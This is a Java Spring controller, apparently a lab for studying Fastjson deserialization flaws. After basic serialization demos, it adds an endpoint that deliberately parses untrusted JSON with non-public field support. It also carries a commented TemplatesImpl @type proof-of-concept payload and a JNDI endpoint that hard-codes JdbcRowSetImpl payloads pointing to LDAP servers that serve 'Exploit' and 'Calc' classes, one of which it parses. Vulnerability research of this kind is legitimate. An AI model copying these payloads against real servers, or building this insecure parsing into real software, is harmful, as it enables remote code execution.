package com.snowsec0.controller;

import java.util.Map;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.snowsec0.dao.User;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.rowset.JdbcRowSetImpl;

@RestController
@RequestMapping("/web")
public class WebController {
	
	@RequestMapping("welcome")
	public String web()
	{
		return "web controller welcome";
	}
	
	@RequestMapping("fastjson")
	public Object fastjson()
	{
		//将对象转换成json string类型
		User user = new User("snowsec0", "hello world");
		String text = JSON.toJSONString(user);
		System.out.println(text);
		//使用单引号
		text = JSON.toJSONString(user,SerializerFeature.UseSingleQuotes);
		System.out.println(text);
		  
		//对象转换
		String s="{\"name\":\"hahahahaha\"}";  ;
		JSONObject object = JSON.parseObject(s);
		System.out.println(object.get("name"));
		  
		//转换成对象
		String users = "{\"name\":\"snowsec0\",\"password\":\"snowsec0\"}";
		User user1 = JSON.parseObject(users,User.class);
		System.out.println(user1.getUsername()+"_"+user1.getPassword());
		  
		//使用WriteClassName特性
		users = JSON.toJSONString(user1,SerializerFeature.WriteClassName);
		System.out.println(users);
		  
		//序列化解析
		users = "{\"@type\":\"com.snowsec0.dao.User\",\"username\":\"snowsec0\",\"password\":\"password\"}\r\n" + 
		    "";
		user  = (User) JSON.parse(users);
		System.out.println(user.getUsername()+"-"+user.getPassword());    
		return user;
	}
	
	
	 
	//基于 TemplateImpl 的 PoC
	//{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"base64_calss\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}
	//通过postMan提交json格式数据
	@PostMapping("adduser")
	public Object adduser(@RequestBody Map<String,Object> map){
	//{"json":"{\"name\":\"snowsec0\",\"password\":\"hello world\"}"}
		ParserConfig config = new ParserConfig();
		System.err.println(map.get("json"));
		String str = (String) map.get("json");
		Object user = JSON.parseObject(str,Object.class, config, Feature.SupportNonPublicField);
		return user;
	}
	//基于JNDI的POC
	@PostMapping("jndiuser")
	public Object jndiuser(@RequestBody User user)
	{
		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Calc\",\"autoCommit\":true}";
        JSONObject.parse(payload2);
		return user;
	}
}
